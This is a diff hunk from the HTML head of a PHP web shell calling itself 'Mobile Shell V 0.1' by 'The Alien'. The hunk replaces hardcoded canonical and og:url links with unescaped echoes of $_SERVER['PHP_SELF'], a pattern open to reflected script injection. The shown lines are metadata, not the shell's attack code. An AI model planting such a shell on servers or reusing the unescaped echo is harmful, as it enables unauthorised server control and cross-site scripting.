@@ -295,8 +295,8 @@ if (isset($_POST['deletefile']))
 	<meta http-equiv="imagetoolbar" content="no">
 	<link rel="SHORTCUT ICON" href="https://ijazurrahim.com/mobiShell/icons/icon.png">
 	<meta property="og:title" content="Mobile Shell V 0.1 | The Alien" />
-	<link rel="canonical" href="https://www.ijazurrahim.com" />
-	<meta property="og:url" content="https://www.ijazurrahim.com" />
+	<link rel="canonical" href="<?php echo $_SERVER['PHP_SELF']; ?>" />
+	<meta property="og:url" content="<?php if ($_SERVER['SERVER_PROTOCOL']=='HTTP/1.1') echo 'http://'; else echo 'https://';echo $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']; ?>" />
 	<meta property="og:image" content="https://www.ijazurrahim.com/mobiShell/icons/bg.png" />
 	<meta property="og:description" content="This Shell is coded by The Alien and is an open source, anyone can modify or edit the shell,This Shell is coded only for educational purpose and to make security researching more interesing,if anyone used it for illegal purpose then they are responsible" />
 	<meta property="og:type" content="website" />
